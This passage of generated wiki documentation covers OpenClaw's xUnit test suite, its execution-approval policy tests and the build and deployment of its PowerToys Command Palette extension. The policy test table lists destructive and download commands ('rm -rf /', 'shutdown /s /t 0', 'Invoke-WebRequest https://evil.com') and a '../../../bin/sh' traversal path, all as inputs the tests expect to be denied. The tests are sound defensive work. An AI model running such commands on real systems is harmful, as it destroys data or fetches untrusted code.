    subgraph "CanvasCapabilityTests"
        CanPresent["canvas.present<br/>URL, dimensions, flags<br/>Default values"]
        CanNav["canvas.navigate<br/>URL validation"]
        CanEval["canvas.eval<br/>Script execution<br/>Handler registration"]
        CanSnap["canvas.snapshot<br/>Format, quality, size"]
        CanA2UI["canvas.a2ui.push/reset<br/>JSONL handling<br/>File reading"]
    end
    
    subgraph "ScreenCapabilityTests"
        ScrCapture["screen.capture<br/>Format, monitor index<br/>Result structure"]
        ScrList["screen.list<br/>Monitor enumeration"]
    end
    
    subgraph "CameraCapabilityTests"
        CamList["camera.list<br/>Device enumeration"]
        CamSnap["camera.snap<br/>Device ID, format<br/>Quality, dimensions"]
    end
```

#### System Capability Tests

The `SystemCapabilityTests` class validates notification display, command execution, executable resolution, and approval policy management:

| Test Case | Purpose | Key Assertions |
|-----------|---------|----------------|
| `CanHandle_SystemNotify` | Validates command routing | Accepts `system.notify`, `system.run`, `system.which` |
| `Notify_RaisesEvent_WithArgs` | Tests notification event | Event fired with correct title, body, sound flag |
| `Notify_DefaultsTitle_WhenMissing` | Tests default values | Title defaults to "OpenClaw" |
| `Run_AcceptsCommandAsArray` | Tests argv-style commands | Parses `["echo", "hello", "world"]` correctly |
| `Run_AcceptsCommandAsString` | Tests string commands | Supports single string command |
| `Run_RejectsPathsWithSeparators` | Tests security | Rejects `../../../bin/sh` paths |
| `Which_FindsKnownBins` | Tests PATH resolution | Finds `cmd.exe` on Windows |
| `Which_OmitsMissingBins` | Tests missing executables | Returns empty for nonexistent binaries |

**Sources:** [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:15-327]()

#### Canvas Capability Tests

The `CanvasCapabilityTests` class validates WebView2 control commands and Adaptive UI functionality:

| Test Case | Purpose | Key Assertions |
|-----------|---------|----------------|
| `Present_RaisesEvent_WithArgs` | Tests window display | URL, width, height, title, alwaysOnTop parsed |
| `Present_UsesDefaults_WhenArgsMissing` | Tests fallback values | 800x600, "Canvas" title |
| `Navigate_ReturnsError_WhenUrlMissing` | Tests validation | Error for missing URL |
| `Eval_AcceptsJavaScriptParam` | Tests script execution | Handler receives correct script |
| `Snapshot_CallsHandler_WithArgs` | Tests screenshot capture | Format, maxWidth, quality passed |
| `A2UIPush_WithJsonlPath_ReadsFile` | Tests file reading | Reads JSONL from disk |

**Sources:** [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:329-636]()

#### Screen and Camera Capability Tests

These tests validate screen capture and camera snapshot functionality:

| Test Case | Purpose | Key Assertions |
|-----------|---------|----------------|
| `Capture_CallsHandler_WithArgs` | Tests screen capture | Format, maxWidth, quality, monitor index |
| `Capture_ResponseIncludesDataUri` | Tests response format | Returns `data:image/png;base64,...` |
| `List_ReturnsScreens_WhenHandler` | Tests monitor enumeration | Returns array of `ScreenInfo` |
| `Snap_CallsHandler_WithArgs` | Tests camera capture | DeviceId, format, maxWidth, quality |
| `Snap_UsesDefaults_WhenArgsMissing` | Tests defaults | 1280px maxWidth, 80% quality, JPEG |

**Sources:** [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:638-899]()

### Model Tests

The model tests validate display text formatting, status determination, and property calculations for data transfer objects:

```mermaid
graph TB
    subgraph "AgentActivityTests"
        AGlyph["Glyph property<br/>Emoji for each ActivityKind"]
        ADisplay["DisplayText property<br/>Prefix + glyph + label"]
    end
    
    subgraph "ChannelHealthTests"
        CDisplay["DisplayText property<br/>Status badge + name"]
        CHealthy["IsHealthyStatus<br/>ok/connected/running"]
        CIntermediate["IsIntermediateStatus<br/>stopped/idle/connecting"]
    end
    
    subgraph "SessionInfoTests"
        SDisplay["DisplayText property<br/>Main/Sub + channel + activity"]
        SShortKey["ShortKey property<br/>Truncation + path extraction"]
        SRich["RichDisplayText<br/>Model, tokens, flags"]
        SAge["AgeText property<br/>just now/Xm/Xh/Xd ago"]
    end
    
    subgraph "GatewayUsageInfoTests"
        UDisplay["DisplayText property<br/>Tokens, cost, requests"]
        UFormat["Number formatting<br/>K/M suffixes"]
    end
    
    subgraph "GatewayNodeInfoTests"
        NShortId["ShortId property<br/>Truncate with ellipsis"]
        NDisplay["DisplayText<br/>Name + online/offline"]
        NDetail["DetailText<br/>Mode, platform, counts"]
    end
```

Key test patterns for models:

- **Display Text Formatting**: Tests verify that `DisplayText` properties format data correctly for UI display, including conditional sections and separators
- **Status Classification**: Tests validate `IsHealthyStatus` and `IsIntermediateStatus` helper methods with comprehensive status string coverage
- **Number Formatting**: Tests ensure large numbers are formatted with K/M suffixes (e.g., 2.5M tokens)
- **Time Formatting**: Tests verify relative time display (just now, 5m ago, 2h ago, 3d ago)

**Sources:** [tests/OpenClaw.Shared.Tests/ModelsTests.cs:1-829]()

### URL Handling Tests

The `GatewayUrlHelperTests` class validates URL normalization, credential extraction, and sanitization:

```mermaid
graph LR
    subgraph "URL Normalization"
        N1["http:// → ws://"]
        N2["https:// → wss://"]
        N3["Strip user-info"]
        N4["Trim whitespace"]
    end
    
    subgraph "Credential Handling"
        C1["Extract user:pass"]
        C2["URL-decode %40, %2F, etc"]
        C3["Normalize username-only"]
    end
    
    subgraph "Validation"
        V1["Reject invalid schemes"]
        V2["Reject empty/null"]
        V3["Accept ws://, wss://"]
    end
    
    TryNormalize["TryNormalizeWebSocketUrl"]
    Extract["ExtractCredentials"]
    Decode["DecodeCredentials"]
    Sanitize["SanitizeForDisplay"]
    Validate["IsValidGatewayUrl"]
    
    TryNormalize --> N1
    TryNormalize --> N2
    TryNormalize --> N3
    TryNormalize --> N4
    
    Extract --> C1
    Decode --> C2
    Decode --> C3
    
    Validate --> V1
    Validate --> V2
    Validate --> V3
    
    Sanitize --> N3
```

**Test Coverage:**

| Function | Test Cases | Key Scenarios |
|----------|------------|---------------|
| `TryNormalizeWebSocketUrl` | 12 tests | Scheme conversion, credential stripping, whitespace trimming |
| `ExtractCredentials` | 11 tests | URL-encoded characters, username-only, missing credentials |
| `DecodeCredentials` | 5 tests | %40 → @, %2F → /, username-only normalization |
| `SanitizeForDisplay` | 3 tests | Removes user-info for safe logging |
| `IsValidGatewayUrl` | 6 tests | Valid/invalid scheme detection |

**Sources:** [tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs:1-194]()

### Execution Policy Tests

The `ExecApprovalPolicyTests` class validates command approval logic, pattern matching, and policy persistence:

```mermaid
graph TB
    subgraph "Policy Evaluation"
        E1["Match patterns<br/>Wildcard, glob, case-insensitive"]
        E2["First match wins<br/>Rule ordering"]
        E3["Shell filtering<br/>Rule applies to specific shells"]
        E4["Default action<br/>Allow/deny/prompt"]
    end
    
    subgraph "Pattern Matching"
        P1["* matches everything"]
        P2["Get-* matches prefix"]
        P3["*dangerous* contains"]
        P4["? single character"]
    end
    
    subgraph "Persistence"
        S1["Save to exec-policy.json"]
        S2["Load from disk"]
        S3["Handle corrupt files<br/>Fall back to defaults"]
    end
    
    subgraph "Policy Management"
        M1["AddRule<br/>Append new rule"]
        M2["RemoveRule<br/>Delete by index"]
        M3["InsertRule<br/>Insert at position"]
        M4["SetRules<br/>Replace entire policy"]
    end
    
    Evaluate["ExecApprovalPolicy.Evaluate"]
    
    Evaluate --> E1
    Evaluate --> E2
    Evaluate --> E3
    Evaluate --> E4
    
    E1 --> P1
    E1 --> P2
    E1 --> P3
    E1 --> P4
```

#### Default Policy Tests

The default policy includes safe commands and denies dangerous operations:

| Test | Command | Expected Result |
|------|---------|-----------------|
| `DefaultPolicy_AllowsEchoCommands` | `echo hello world` | Allowed (pattern: `echo *`) |
| `DefaultPolicy_AllowsGetCmdlets` | `Get-Process` | Allowed (PowerShell Get- cmdlets) |
| `DefaultPolicy_DeniesRemoveItem` | `Remove-Item C:\important` | Denied (destructive) |
| `DefaultPolicy_DeniesRm` | `rm -rf /` | Denied (destructive) |
| `DefaultPolicy_DeniesShutdown` | `shutdown /s /t 0` | Denied (system control) |
| `DefaultPolicy_DeniesWebDownloads` | `Invoke-WebRequest https://evil.com` | Denied (network download) |

**Sources:** [tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs:1-394]()

#### System Capability Integration Tests

The `SystemCapabilityExecApprovalsTests` class validates integration between `SystemCapability` and `ExecApprovalPolicy`:

- **Policy Enforcement**: `system.run` commands are checked against the approval policy before execution
- **Allow/Deny Behavior**: Approved commands execute, denied commands return error responses
- **Policy CRUD**: `system.execApprovals.get` and `system.execApprovals.set` commands manage policy rules
- **Graceful Degradation**: When no policy is configured, all commands are allowed

**Sources:** [tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs:396-561]()

### Integration Tests

The `WindowsNodeClientTests` class validates client initialization and URL normalization:

```mermaid
graph LR
    Constructor["WindowsNodeClient<br/>constructor"]
    
    Input["Input URL<br/>http/https/ws/wss"]
    Normalize["GatewayUrlHelper<br/>NormalizeForWebSocket"]
    Store["_gatewayUrl field<br/>ws:// or wss://"]
    
    Constructor --> Input
    Input --> Normalize
    Normalize --> Store
    
    Test["Constructor_NormalizesGatewayUrl<br/>Theory test"]
    Reflect["Reflection<br/>Read private field"]
    Assert["Assert.Equal<br/>expectedUrl, actualUrl"]
    
    Test --> Constructor
    Test --> Reflect
    Reflect --> Assert
```

**Sources:** [tests/OpenClaw.Shared.Tests/WindowsNodeClientTests.cs:1-38]()

## Running Tests

### Local Execution

Run all tests from the repository root:

```bash
dotnet test
```

Run tests for a specific test class:

```bash
dotnet test --filter FullyQualifiedName~SystemCapabilityTests
```

Run a single test method:

```bash
dotnet test --filter FullyQualifiedName~SystemCapabilityTests.Notify_RaisesEvent_WithArgs
```

### CI/CD Execution

Tests run automatically in GitHub Actions on every push and pull request. The workflow:

1. **Restore Dependencies**: `dotnet restore`
2. **Build Solution**: `dotnet build --no-restore`
3. **Run Tests**: `dotnet test --no-build --verbosity normal`

Test results are displayed in the GitHub Actions workflow log. Failed tests block the build and prevent releases.

**Sources:** [.github/workflows/build.yml]()

## Test Patterns and Conventions

### Test Class Organization

Each test class follows a consistent structure:

```mermaid
graph TB
    TestClass["Test Class<br/>(e.g., SystemCapabilityTests)"]
    
    Helper["Helper Methods<br/>Parse(json)<br/>CreateCapability()"]
    Facts["[Fact] Tests<br/>Single scenario"]
    Theories["[Theory] Tests<br/>Multiple inputs"]
    Mock["Mock/Fake Objects<br/>FakeCommandRunner<br/>NullLogger"]
    
    TestClass --> Helper
    TestClass --> Facts
    TestClass --> Theories
    TestClass --> Mock
    
    Facts --> Arrange["Arrange<br/>Create capability<br/>Set up handlers"]
    Facts --> Act["Act<br/>ExecuteAsync(request)"]
    Facts --> Assert["Assert<br/>Verify result"]
    
    Theories --> InlineData["[InlineData]<br/>Parameter sets"]
    InlineData --> Arrange
```

### Common Test Utilities

#### JSON Parsing Helper

All capability tests use a shared `Parse` method to convert JSON strings to `JsonElement`:

```csharp
private static JsonElement Parse(string json)
{
    using var doc = JsonDocument.Parse(json);
    return doc.RootElement.Clone();
}
```

**Sources:** [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:17-21]()

#### Fake Command Runner

Tests use a `FakeCommandRunner` implementation to avoid actual process execution:

```csharp
private class FakeCommandRunner : ICommandRunner
{
    public string Name => "fake";
    public CommandRequest? LastRequest { get; private set; }
    
    public Task<CommandResult> RunAsync(CommandRequest request, CancellationToken ct = default)
    {
        LastRequest = request;
        return Task.FromResult(new CommandResult
        {
            Stdout = "ok",
            Stderr = "",
            ExitCode = 0,
            TimedOut = false,
            DurationMs = 1
        });
    }
}
```

This allows tests to verify command parameters without executing dangerous commands.

**Sources:** [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:309-326]()

#### Test Logger

Tests use a `NullLogger` or minimal test logger to avoid logging noise:

```csharp
internal class ExecTestLogger : IOpenClawLogger
{
    public void Info(string message) { }
    public void Debug(string message) { }
    public void Warn(string message) { }
    public void Error(string message) { }
    public void Error(string message, Exception ex) { }
}
```

**Sources:** [tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs:580-588]()

### Test Data Management

#### Temporary Directories

Policy tests create temporary directories for isolated file system testing:

```csharp
private readonly string _tempDir;

public ExecApprovalPolicyTests()
{
    _tempDir = Path.Combine(Path.GetTempPath(), $"openclaw-test-{Guid.NewGuid():N}");
    Directory.CreateDirectory(_tempDir);
}

public void Dispose()
{
    try { Directory.Delete(_tempDir, true); } catch { }
}
```

**Sources:** [tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs:13-25]()

#### Theory Data

Theory tests use `[InlineData]` attributes for parameterized testing:

```csharp
[Theory]
[InlineData("ok", "[ON]")]
[InlineData("connected", "[ON]")]
[InlineData("running", "[ON]")]
[InlineData("error", "[ERR]")]
[InlineData("disconnected", "[ERR]")]
public void DisplayText_ShowsStatusBadge(string status, string expected)
{
    var health = new ChannelHealth { Name = "slack", Status = status };
    Assert.StartsWith(expected, health.DisplayText);
}
```

This pattern ensures comprehensive coverage of all status values and edge cases.

**Sources:** [tests/OpenClaw.Shared.Tests/ModelsTests.cs:128-173]()

## Coverage Expectations

The test suite focuses on unit testing critical components:

| Component | Coverage Priority | Test Focus |
|-----------|-------------------|------------|
| Capabilities | **High** | Command parsing, event raising, error handling |
| Models | **High** | Display text formatting, status logic |
| URL Helpers | **High** | Normalization, credential extraction, validation |
| Exec Policy | **High** | Pattern matching, persistence, security |
| Gateway Client | **Medium** | URL normalization (limited integration tests) |
| UI Components | **Low** | Manual testing (WinForms/WinUI not easily testable) |

### What Is Not Tested

The following components are excluded from automated testing:

- **UI Components**: WinForms and WinUI windows, dialogs, and tray icons
- **WebView2 Integration**: Browser control initialization and JavaScript execution
- **System Integration**: Registry manipulation, Windows notifications, global hotkeys
- **Camera/Screen Capture**: Actual hardware access and media capture
- **Network Communication**: WebSocket connections (mocked in tests)

These components require manual testing or are tested indirectly through integration testing.

**Sources:** [tests/OpenClaw.Shared.Tests/]()

---

**Key Takeaways:**

1. Tests use **xUnit** with **[Fact]** and **[Theory]** attributes
2. Capability tests validate **command routing, argument parsing, and event raising**
3. Model tests verify **display text formatting and status logic**
4. Policy tests ensure **security through pattern matching and approval rules**
5. Tests run **automatically in CI/CD** and can be executed locally with `dotnet test`
6. **Fake/mock objects** prevent dangerous operations during testing
7. Focus is on **unit testing shared library components**, not UI

---

# Page: PowerToys Command Palette Extension

# PowerToys Command Palette Extension

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [.github/workflows/ci.yml](.github/workflows/ci.yml)
- [README.md](README.md)
- [build.ps1](build.ps1)
- [src/OpenClaw.Shared/OpenClaw.Shared.csproj](src/OpenClaw.Shared/OpenClaw.Shared.csproj)
- [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs](src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs)

</details>



This page documents the development, build, and deployment of the **OpenClaw.CommandPalette** PowerToys extension, which provides quick access to OpenClaw functionality from the PowerToys Command Palette (Win+Alt+Space).

For information about the tray application that the extension complements, see [Tray Application](#2). For details on deep link handling that the extension uses to trigger actions, see [Deep Links & URI Schemes](#5.2).

---

## Overview

The **OpenClaw.CommandPalette** project is a PowerToys Command Palette extension packaged as an MSIX application. It provides a keyboard-driven interface to common OpenClaw operations, allowing users to quickly access dashboard pages, send messages, and view status without touching the system tray.

**Key Characteristics:**
- **Platform:** Windows 10/11 with PowerToys installed
- **Package Format:** MSIX (Universal Windows Platform)
- **Target Frameworks:** Multi-architecture (x64, ARM64)
- **Activation:** Win+Alt+Space → type "OpenClaw"
- **Distribution:** Bundled with Inno Setup installers

**Sources:** [README.md:251-268](), [.github/workflows/ci.yml:200-226]()

---

## Project Structure

The CommandPalette extension follows the PowerToys extension architecture, requiring MSIX packaging for integration with the Command Palette host process.

```mermaid
graph TB
    subgraph "OpenClaw.CommandPalette"
        Project["OpenClaw.CommandPalette.csproj<br/>MSIX package project"]
        Manifest["Package.appxmanifest<br/>Extension declaration"]
        ExtensionDef["Extension definition<br/>Commands + metadata"]
    end
    
    subgraph "Dependencies"
        Shared["OpenClaw.Shared<br/>Gateway client library"]
        DeepLinks["Deep Link Handler<br/>openclaw:// URIs"]
    end
    
    subgraph "PowerToys Runtime"
        CommandPalette["PowerToys Command Palette<br/>Win+Alt+Space"]
        Host["Extension Host Process"]
    end
    
    Project --> Manifest
    Manifest --> ExtensionDef
    Project --> Shared
    ExtensionDef --> DeepLinks
    
    Host --> ExtensionDef
    CommandPalette --> Host
    DeepLinks --> TrayApp["OpenClaw.Tray.WinUI<br/>Tray application"]
```

**Sources:** [README.md:251-268](), [build.ps1:192]()

---

## Available Commands

The extension exposes six commands through the PowerToys Command Palette interface:

| Command | Icon | Action | Deep Link Target |
|---------|------|--------|------------------|
| **Open Dashboard** | 🦞 | Launch web dashboard in default browser | `openclaw://dashboard` |
| **Quick Send** | 💬 | Open Quick Send dialog | `openclaw://send` |
| **Full Status** | 📊 | View detailed gateway status window | `openclaw://status` (inferred) |
| **Sessions** | ⚡ | View active agent sessions | `openclaw://dashboard/sessions` |
| **Channels** | 📡 | View channel health status | `openclaw://dashboard/channels` |
| **Health Check** | 🔄 | Trigger gateway health refresh | Action-based |

Each command triggers either:
1. **Deep link invocation** via `openclaw://` URI scheme (most common)
2. **Direct tray action** via IPC if tray is running
3. **Browser navigation** for dashboard links

**Sources:** [README.md:255-262](), [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs:58-104]()

---

## Command Registration Flow

```mermaid
sequenceDiagram
    participant User
    participant PT as "PowerToys<br/>Command Palette"
    participant Ext as "OpenClaw.CommandPalette<br/>Extension"
    participant OS as "Windows Shell<br/>URI Handler"
    participant Tray as "OpenClaw.Tray.WinUI"
    
    User->>PT: Win+Alt+Space
    PT->>Ext: Load extension manifest
    Ext-->>PT: Register 6 commands
    
    User->>PT: Type "OpenClaw"
    PT-->>User: Show filtered commands
    
    User->>PT: Select "Open Dashboard"
    PT->>Ext: Execute command
    Ext->>OS: ShellExecute("openclaw://dashboard")
    OS->>Tray: Launch/activate + forward URI
    Tray->>Tray: DeepLinkHandler.Handle()
    Tray->>OS: Open browser to gateway URL
```

**Sources:** [README.md:263-267](), [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs:46-105]()

---

## Build Configuration

The CommandPalette project uses a distinct build approach compared to the tray applications due to MSIX packaging requirements.

### Build Matrix

The CI/CD pipeline builds the extension for multiple architectures:

| Architecture | Platform Identifier | Output Path |
|-------------|---------------------|-------------|
| x64 (Intel/AMD) | `x64` | `bin/x64/Debug/` |
| ARM64 (Surface, etc.) | `arm64` | `bin/arm64/Debug/` |

**Key Build Properties:**
- **No Runtime Identifier Required:** Unlike WinUI projects, CommandPalette uses `UseRid = false`
- **Platform-Specific:** Uses MSBuild `-p:Platform=` instead of `-r` (runtime identifier)
- **MSIX Output:** Generates `.msix` package with manifest

**Sources:** [.github/workflows/ci.yml:203-220](), [build.ps1:192]()

### Build Commands

```mermaid
graph LR
    Source["Source Code"] --> Restore["dotnet restore<br/>OpenClaw.CommandPalette"]
    Restore --> Build["dotnet build<br/>-c Debug<br/>-p:Platform=x64/arm64"]
    Build --> Artifact["bin/{platform}/Debug/<br/>AppxManifest.xml<br/>Extension DLLs<br/>Dependencies"]
```

**Example Build Command:**
```bash
dotnet build src/OpenClaw.CommandPalette -c Debug -p:Platform=x64
```

**Sources:** [.github/workflows/ci.yml:215-220](), [build.ps1:159-186]()

---

## CI/CD Pipeline Integration

The extension build is isolated into its own job (`build-extension`) in the GitHub Actions workflow:

```mermaid
graph TB
    subgraph "Build Extension Job"
        Checkout["Checkout code"]
        SetupDotnet["Setup .NET 10"]
        Restore["Restore dependencies"]
        BuildX64["Build x64"]
        BuildARM64["Build ARM64"]
        UploadX64["Upload artifact<br/>openclaw-commandpalette-x64"]
        UploadARM64["Upload artifact<br/>openclaw-commandpalette-arm64"]
    end
    
    subgraph "Release Job"
        Download["Download artifacts"]
        BundleInstaller["Bundle with Inno Setup<br/>installer"]
        SignInstaller["Sign installer EXE"]
        Release["Create GitHub Release"]
    end
    
    Checkout --> SetupDotnet
    SetupDotnet --> Restore
    Restore --> BuildX64
    Restore --> BuildARM64
    BuildX64 --> UploadX64
    BuildARM64 --> UploadARM64
    
    UploadX64 --> Download
    UploadARM64 --> Download
    Download --> BundleInstaller
    BundleInstaller --> SignInstaller
    SignInstaller --> Release
```

**Build Outputs:**
- **Artifact Name:** `openclaw-commandpalette-{platform}` (x64 or arm64)
- **Contents:** Full build output directory including `AppxManifest.xml`
- **Usage:** Extracted and bundled into installer's `cmdpal/` subdirectory

**Sources:** [.github/workflows/ci.yml:200-226](), [.github/workflows/ci.yml:227-382]()

---

## Deployment Process

### Installer Integration

The Inno Setup installer (`installer.iss`) includes optional CommandPalette deployment:

```mermaid
graph TB
    subgraph "Installer Build Process"
        PrepareX64["Prepare publish-x64/<br/>Tray app files"]
        CopyExtX64["Copy cmdpal artifacts<br/>to publish-x64/cmdpal/"]
        BuildInstX64["Build x64 installer<br/>ISCC.exe /DMyAppArch=x64"]
        
        PrepareARM64["Prepare publish-arm64/<br/>Tray app files"]
        CopyExtARM64["Copy cmdpal artifacts<br/>to publish-arm64/cmdpal/"]
        BuildInstARM64["Build ARM64 installer<br/>ISCC.exe /DMyAppArch=arm64"]
    end
    
    subgraph "Installation Options"
        UserChoice["User selects components"]
        TrayOnly["Install Tray App only"]
        TrayPlusPT["Install Tray App<br/>+ Command Palette"]
    end
    
    PrepareX64 --> CopyExtX64
    CopyExtX64 --> BuildInstX64
    PrepareARM64 --> CopyExtARM64
    CopyExtARM64 --> BuildInstARM64
    
    BuildInstX64 --> UserChoice
    UserChoice --> TrayOnly
    UserChoice --> TrayPlusPT
```

**Installer Steps:**
1. Download CI artifact: `openclaw-commandpalette-{platform}`
2. Find `AppxManifest.xml` location (manifest folder)
3. Copy entire manifest folder to `publish-{arch}/cmdpal/`
4. Build installer with embedded MSIX contents
5. User selects component during installation

**Sources:** [.github/workflows/ci.yml:296-321]()

### Manual Deployment

For developers testing locally:

1. **Build in Release mode:**
   ```powershell
   dotnet build src/OpenClaw.CommandPalette -c Release -p:Platform=x64
   ```

2. **Locate MSIX package:**
   ```
   src/OpenClaw.CommandPalette/bin/x64/Release/AppPackages/*.msix
   ```

3. **Deploy via Visual Studio:**
   - Open solution in Visual Studio
   - Right-click CommandPalette project → Deploy
   - Or use PowerShell: `Add-AppxPackage -Path .\package.msix`

4. **Verify in PowerToys:**
   - Open Command Palette (Win+Alt+Space)
   - Type "OpenClaw" to filter commands
   - Verify 6 commands appear

**Sources:** [README.md:263-267]()

---

## Extension Architecture

### MSIX Manifest Structure

The `Package.appxmanifest` declares the PowerToys extension integration:

```mermaid
graph TB
    subgraph "Package.appxmanifest"
        Identity["Package Identity<br/>Publisher, Version"]
        Properties["Display Properties<br/>Name, Icon, Description"]
        Extensions["Extensions Declaration"]
    end
    
    subgraph "Extension Configuration"
        PTExtension["PowerToys Extension<br/>Category, EntryPoint"]
        Commands["Command Definitions<br/>6 commands with icons"]
        Capabilities["App Capabilities<br/>Internet, Local access"]
    end
    
    Identity --> Properties
    Properties --> Extensions
    Extensions --> PTExtension
    PTExtension --> Commands
    PTExtension --> Capabilities
```

**Key Manifest Elements:**
- **Extension Category:** PowerToys Command Palette
- **Entry Point:** Main class implementing extension interface
- **Commands Array:** 6 command definitions with metadata
- **Capabilities:** Network access for gateway communication

**Sources:** [README.md:263-267]()

### Dependency on OpenClaw.Shared

The extension references `OpenClaw.Shared` for gateway communication:

| Shared Component | Usage in Extension |
|------------------|-------------------|
| `OpenClawGatewayClient` | Check gateway connectivity (optional) |
| `GatewayUrlHelper` | Construct dashboard URLs |
| Data models | Display current state (if implemented) |
| `IOpenClawLogger` | Extension logging |

**Note:** Most commands use deep links rather than direct gateway communication, minimizing the extension's runtime dependencies.

**Sources:** [src/OpenClaw.Shared/OpenClaw.Shared.csproj:1-18](), [README.md:269-276]()

---

## Deep Link Integration

Commands primarily work by invoking `openclaw://` URIs, which are handled by the tray application:

```mermaid
graph LR
    CMD1["Open Dashboard"] --> DL1["openclaw://dashboard"]
    CMD2["Quick Send"] --> DL2["openclaw://send"]
    CMD3["Sessions"] --> DL3["openclaw://dashboard/sessions"]
    CMD4["Channels"] --> DL4["openclaw://dashboard/channels"]
    CMD5["Settings"] --> DL5["openclaw://settings"]
    
    DL1 --> Handler["DeepLinkHandler.Handle()"]
    DL2 --> Handler
    DL3 --> Handler
    DL4 --> Handler
    DL5 --> Handler
    
    Handler --> Action1["OpenDashboard(path)"]
    Handler --> Action2["OpenQuickSend(msg)"]
    Handler --> Action3["OpenSettings()"]
```

**Deep Link Registration:**
- **MSIX Packaged Apps:** Declared in `Package.appxmanifest` → no registry needed
- **Portable Apps:** Registered via `DeepLinkHandler.RegisterUriScheme()`
- **Handler Location:** [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs:46-105]()

**Sources:** [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs:15-44](), [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs:46-105]()

---

## Versioning and Updates

The extension follows the same GitVersion-based versioning as the main application:

| Version Component | Source | Example |
|------------------|--------|---------|
| **Major.Minor.Patch** | Git tags (`v*`) | `0.4.4` |
| **MSIX Version** | Patched during CI | `0.4.4.0` |
| **Display Version** | Assembly metadata | `0.4.4+abc123` |

**Update Mechanism:**
- Extension bundled with installer → updated when user installs new version
- No independent update mechanism
- Version must match tray app for compatibility

**Sources:** [.github/workflows/ci.yml:28-52](), [.github/workflows/ci.yml:134-142]()

---

## Development Workflow

### Local Development

```mermaid
graph TB
    Edit["Edit extension code"]
    Build["dotnet build -c Debug<br/>-p:Platform=x64"]
    Deploy["Deploy MSIX via<br/>Visual Studio"]
    Test["Test in PowerToys<br/>Win+Alt+Space"]
    Debug["Debug with logs<br/>Check tray app behavior"]
    
    Edit --> Build
    Build --> Deploy
    Deploy --> Test
    Test --> Debug
    Debug --> Edit
```

**Development Tips:**
1. **Platform Selection:** Always specify `-p:Platform=x64` or `arm64`
2. **Visual Studio Deployment:** Use "Deploy" not "Run" (MSIX sideloading)
3. **Testing:** PowerToys must be running to test extension
4. **Debugging:** Most logic executes in tray app, not extension process
5. **Logs:** Check tray app logs at `%LOCALAPPDATA%\OpenClawTray\openclaw-tray.log`

**Sources:** [build.ps1:159-186](), [README.md:295-300]()

### Build Script Integration

The `build.ps1` script supports CommandPalette builds:

```powershell
# Build CommandPalette specifically
.\build.ps1 -Project CommandPalette

# Build all projects (excludes CommandPalette by default)
.\build.ps1 -Project All
```

**Note:** CommandPalette is not included in "All" builds because it requires PowerToys runtime for testing.

**Sources:** [build.ps1:25-33](), [build.ps1:188-207]()

---

## Testing

### Manual Testing Checklist

| Test Case | Expected Behavior |
|-----------|-------------------|
| **Extension Visibility** | Type "OpenClaw" in Command Palette → 6 commands shown |
| **Open Dashboard** | Opens browser to gateway dashboard URL |
| **Quick Send** | Opens Quick Send dialog in tray app |
| **Sessions** | Opens browser to `/sessions` page |
| **Channels** | Opens browser to `/channels` page |
| **Deep Link Forwarding** | Commands work when tray app already running |
| **Tray Launch** | Commands launch tray app if not running |
| **Multi-Instance** | Commands forwarded to existing instance via IPC |

**Testing Prerequisites:**
- PowerToys installed and running
- OpenClaw gateway running at `ws://localhost:18789`
- Tray app configured with valid token

**Sources:** [README.md:263-267]()

### Automated Testing

The CI pipeline includes build validation but no dedicated extension tests:

- **Build Test:** Verify MSIX package builds without errors
- **Artifact Test:** Confirm `AppxManifest.xml` exists in output
- **No Runtime Tests:** PowerToys runtime required, not available in CI

**Sources:** [.github/workflows/ci.yml:200-226]()

---

## Troubleshooting

### Common Issues

| Issue | Cause | Solution |
|-------|-------|----------|
| **Commands not appearing** | Extension not deployed | Deploy MSIX via Visual Studio or installer |
| **Commands fail silently** | Tray app not running | Launch tray app manually |
| **Deep links don't work** | URI scheme not registered | Reinstall or check registry |
| **Wrong dashboard URL** | Incorrect gateway settings | Configure tray app settings |
| **Platform mismatch** | Built for x64, running ARM64 | Build for correct platform |

**Diagnostic Steps:**
1. Check PowerToys extension list: Settings → Command Palette → Extensions
2. Verify tray app is running: Look for lobster icon in system tray
3. Check tray app logs: `%LOCALAPPDATA%\OpenClawTray\openclaw-tray.log`
4. Test deep links manually: Run `start openclaw://dashboard` from Run dialog

**Sources:** [README.md:263-267](), [README.md:295-300]()

---

## File Locations

| Component | Path | Description |
|-----------|------|-------------|
| **Project File** | `src/OpenClaw.CommandPalette/OpenClaw.CommandPalette.csproj` | MSIX project definition |
| **Manifest** | `src/OpenClaw.CommandPalette/Package.appxmanifest` | Extension declaration |
| **Build Output** | `src/OpenClaw.CommandPalette/bin/{platform}/Debug/` | Compiled extension |
| **CI Artifacts** | GitHub Actions artifacts: `openclaw-commandpalette-{platform}` | Released packages |
| **Installed Location** | `%LOCALAPPDATA%\Packages\OpenClaw.CommandPalette_*\` | Deployed MSIX sandbox |

**Sources:** [build.ps1:192](), [.github/workflows/ci.yml:221-225]()